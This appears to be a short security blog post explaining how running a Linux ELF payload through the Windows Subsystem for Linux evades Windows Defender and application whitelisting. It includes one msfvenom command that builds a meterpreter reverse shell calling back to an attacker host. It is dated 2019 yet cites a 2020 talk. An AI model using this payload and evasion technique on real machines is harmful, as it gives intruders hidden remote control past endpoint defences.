---
title: Bypassing Windows Defender with the Windows Subsystem for Linux!
date: 2019-01-16
draft: false
---

After watching BHIS’s Sacred Cash Cow Tipping 2020 I was inspired to try out a few of the techniques BHIS demo’d, and this is a pretty fun and odd one.

There’s a few issues with WSL that make it a really poor choice for hacking without some configurations. The interesting one here is that WSL **does not use VHDs or emulate linux filesystems**, in fact, you can navigate to `%AppData%/Local/Packages/$LinuxDistro/LocalState/rootfs` and interact with the entire filesystem.

This also means that every file you make/drop to WSL is scanned by Windows Defender. Don’t even try to install metasploit.

However, as BHIS points out, elf files are not scanned by Defender. So to test this, if you fire up a normal metasploit session and do a quick `msfvenom -f elf -p linux/x64/meterpreter_reverse_tcp LHOST=$IP LPORT=4444 > payload.elf` you can simply drop it to disk and run it through WSL. A shell comes back, no questions asked.

This is pretty cool and exciting and all, but there’s a few drawbacks. The first issue is that since you’re running from a linux payload and from within WSL, you can’t use typical metasploit windows goodies like priv and kiwi without first pivoting.

The other issue is that this technique has a lot of preconditions. You need to first have initial access obviously, but you also need the target to have WSL installed, with a linux distribution installed. This is not most workstations. Installing a linux distro into WSL requires you to first enable the WSL feature in Windows, then restart the machine, and finally install the distro of your choice. Steps 1 and 3 both require administrative privileges by default, so I don’t see a practical use-case unless you can somehow install WSL without admin or the machine is preconfigued.

It’s a very neat trick though, and runs all processes through WSL, which allows you to bypass application whitelisting as well.